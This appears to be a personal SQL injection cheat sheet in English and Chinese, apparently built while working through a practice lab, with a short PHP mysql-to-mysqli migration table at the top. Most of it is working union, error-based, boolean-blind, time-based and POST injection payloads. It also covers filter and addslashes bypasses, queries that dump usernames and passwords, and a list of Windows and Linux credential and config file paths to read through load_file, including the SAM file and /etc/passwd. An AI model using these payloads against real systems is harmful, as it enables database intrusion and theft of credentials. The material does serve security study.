S.No 	Replace 	Replace By
1 	mysql_query($sql) 	mysqli_query($con, $sql)
2 	mysql_error() 	mysqli_error($con)
3 	mysql_fetch_array($result) 	mysqli_fetch_array($result, MYSQLI_BOTH)
5 	mysql_connect($host,$dbuser,$dbpass) 	mysqli_connect($host,$dbuser,$dbpass)
6 	mysql_real_escape_string($value) 	mysqli_real_escape_string($con, $value)
7 	mysql_select_db($dbname, $con) 	mysqli_select_db($con, $dbname)# 基于错误和输出的注入

## get how SELECT param be enveloped
SELECT * FROM table_name WHERE username='Raj' AND password='Chandel';
SELECT * FROM table_name WHERE username=('Raj') AND password=('Chandel');
SELECT * FROM table_name WHERE username="Raj" AND password="Chandel";
SELECT * FROM table_name WHERE username=("Raj") AND password=("Chandel");

## make it work or wrong
?id=1
?id=1\

## get what is SELECTed
?id=1' order by 1 #                NO ERROR
?id=1' order by 2 #                NO ERROR
?id=1' order by 3 #                NO ERROR
?id=1' order by 4 #                ERROR!!!

## union injection
?id=-1' union select 1,2,3 #
?id=-1' union select 'a','b','c' #

## 基于联合查询的SQL注入
Variable/function	Output
user()	Current User
database()	Current Database
version()	Database Version
schema()	Current Database
UUID()	System UUID Key
current_user()	Current User
system_user()	Current System User
session_user()	Session User
@@hostname	Current Hostname
@@tmpdir	Temporary Directory
@@datadir	Data Directory
@@version	Version of Database
@@basedir	Base Directory
@@GLOBAL.have_symlink	Check if symlink is Enabled or Disabled
@@GLOBAL.have_ssl	Check if it SSL is available

## get a certain table
?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+

## get all tables
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

## get all column names in a certain table
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

## get information in a certain table
?id=-1' union select 1,group_concat(username),3 from users --+
?id=-1' union select 1,group_concat(password),3 from users --+


# 基于布尔代数的盲注

## make it work or wrong
?id=1' AND 1=1 --+
?id=1' AND 1=0 --+

## get length of database()
?id=1' and length(database())<10 --+
?id=1' and length(database())<5 --+
?id=1' and length(database())<8 --+
?id=1' and length(database())<9 --+
?id=1' and length(database())=8 --+

## get name of database()
?id=1' and ascii(substr(database(),1,1))>100 --+
?id=1' and ascii(substr(database(),1,1))>120 --+
?id=1' and ascii(substr(database(),1,1))>110 --+
?id=1' and ascii(substr(database(),1,1))>115 --+
?id=1' and ascii(substr(database(),1,1))=115 --+
?id=1' and ascii(substr(database(),2,1))>100 --+

## get tables of a certain database
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5 --+
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+

## get columns of a certain table
?id=1' and length((select column_name from information_schema.columns where table_name=['users'] limit 0,1))>5 --+
?id=1' and ascii(substr((select column_name from information_schema.columns where table_name=['users'] limit 0,1),1,1))>50 --+

## get information of a certain column
?id=1' and length((select [username] from [users] limit 0,1))<5 --+
?id=1' and ascii(substr((select [username] from [users] limit 0,1),1,1))>50 --+

01. basic : ?id=0' union select --+
02. basic : ?id=0 union select --+
03. basic : ?id=0') union select --+
04. basic : ?id=0") union select --+
05. Blind Injection: Error based : ?id=1' union select 1,2,count(*) from information_schema.tables group by concat_ws(":", database(), floor(rand(0)*2)) --+
06. Blind Injection: ?id=1" and database() regexp '^[a-z]{1,9}' --+
07. Dump into Outfile
08. Blind-Boolian-Single Quotes: ?id=1' and database() regexp '^[a-z]{1,9}' --+
09. Blind-Time based-Single Quotes: FalseOK : ?id=1' and if(database() regexp '[a-z]', !sleep(5), 0) --+
10. Blind-Time based-Double Quotes: FalseOK : ?id=1" and if(database() regexp '[a-z]', !sleep(5), 0) --+
	1st. try ?id=1' and if(1=1, !sleep(5), 0) --+  // no sleep
	2nd. try ?id=1" and if(1=1, !sleep(5), 0) --+  // sleep
	3nd. try ?id=1" and if(database() regexp '[a-z]', !sleep(5), 0) --+  // sleep
11. Post injection - Error Based String : '
12. Post injection - Error Based String : ")
13. Post injection - Double Injection-String-with-twist : ') && into outfile OR Error-Based
	uname=1') union select 1,count(*) from information_schema.tables group by concat_ws("::", database(), floor(rand(0)*2)) #&passwd=&submit=Submit
14. Post injection - Double Injection-Double quotes : "  && into outfile OR Error-Based
	uname=1" union select 1,count(*) from information_schema.tables group by concat_ws("::", database(), floor(rand(0)*2)) #&passwd=&submit=Submit
15. Post injection - Blind - Boolian Based : guess '  && into outfile
	uname=' or if(database() regexp '[a-z]', !sleep(5), 0) limit 0,1#&passwd=&submit=Submit
16. Post injection - Blind - Time Based : guess ") && into outfile 
	uname=") or if(database() regexp '[a-z]', !sleep(5), 0) limit 0,1#&passwd=&submit=Submit
17. Update Query - Error based - String : uname=admin&passwd=1' and extractvalue(1, concat("::", database(), "::", version())) #&submit=Submit
18. Todo: Header Injection-Error Based-String
19. Todo: Header Injection-Referer-Error Based-String
20. Todo: Form injection Cookie Injection-Error Based-String
21. Todo: Form injection Cookie Injection-Error Based-complex-String
22. Todo: Form injection Cookie Injection-Error Based-Double Quotes-String
23. Error Based - no comments : ?id=-1' union select 1,2,3 '1
24. Todo: Second Degree Injections
25. Filter bypass. ascii %xx : ?id=0' union select 1,2,3 'name_of_3
26. Filter bypass. ascii %xx : ?id=0'%a0union%a0select%a01,database(),3%a0%26%26'1=1
26a Filter bypass. ascii %xx : ?id=0')%a0union%a0select%a01,database(),('3
27. Filter bypass. ascii %xx : ?id=0'%a0uniOn%a0SelEct%a01,2,3%a0'a
27a Filter bypass. ascii %xx : ?id=0"%a0uniOn%a0SelEct%a01,2,3%a0"a
28. Filter bypass. ascii %xx : ?id=0')%a0union%a0select%a01,2,3||('a
28a Filter bypass. ascii %xx : ?id=0') union%a0select 1,2,3 || ('a
29. ?id=-1'  union select 1,2,3 'a
30. ?id=-1"  union select 1,2,3 "a
31. ?id=0") union select 1,2,3 --+
32. Bypass addslashes() : ?id=0%aa' union select 1,version(),3 --+
33. Bypass addslashes() : ?id=0%aa' union select 1,version(),3 --+
34. Bypass AddSLASHES() : python -c "print \"\xdf' union select 1,2 #\""
35. why care for addslashes() : ?id=0 union select 1,2,3 --+
36. Todo : mysqli_real_escape_string()
37. Todo : mysqli_real_escape_string()
38. stacked Query : ?id=-1' union select 1,2,3 --+
39. stacked Query Intiger type : ?id=-1  union select 1,2,3 --+
40. stacked Query String type blind : ?id=-1') union select 1,2,3 --+
41. stacked Query Intiger type blind: ?id=-1 union select 1,2,3 --+
42. Todo : mysqli_real_escape_string()
42. Todo : what to do?


select count(*), concat_ws(':', database(), floor(rand(0)*2)) a from information_schema.columns group by a;
select count(*) from information_schema.tables group by concat_ws(':', version(), floor(rand(0)*2));
select count(*) from (select 1 union select 2 union select 3) a group by concat_ws(":", @@basedir, floor(rand(0)*2));
select min(@a:=1) from information_schema.tables group by concat_ws(":", version(),@a:=(@a+1)%2);
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
select extractvalue(1,concat(":",(select @@version), ":"));
select updatexml(1,concat(":",(select version()),":"),1);
select if(database() regexp '^e', sleep(5), 1);
select if(database() regexp '^sec', benchmark(50000000, encode("msg", "by 5 seconds")), 1);
	| mysql | benchmark(10000, md5(1)), sleep(5) |
	| postgresql | pg_sleep(), generate_series(1, 10000) |
	| ms sql server | wait for delay '0:0:5' |

## MySQL注入load_file常用路径
### WINDOWS下:
c:/boot.ini //查看系统版本
c:/windows/php.ini //php配置信息
c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
c:/winnt/php.ini
c:/winnt/my.ini
c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
c:\Program Files\Serv-U\ServUDaemon.ini
c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
c:\Program Files\RhinoSoft.com\ServUDaemon.exe
C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 //存储了pcAnywhere的登陆密码
c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件
c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.
c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
d:\APACHE\Apache2\conf\httpd.conf
C:\Program Files\mysql\my.ini
C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
### LINUX/UNIX 下:
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
/usr/local/apache2/conf/httpd.conf
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP相关设置
/etc/sysconfig/iptables //从中得到防火墙规则策略
/etc/httpd/conf/httpd.conf // apache配置文件
/etc/rsyncd.conf //同步程序配置文件
/etc/my.cnf //mysql的配置文件
/etc/redhat-release //系统版本
/etc/issue
/etc/issue.net
/usr/local/app/php5/lib/php.ini //PHP相关设置
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/sysconfig/iptables 查看防火墙策略

load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
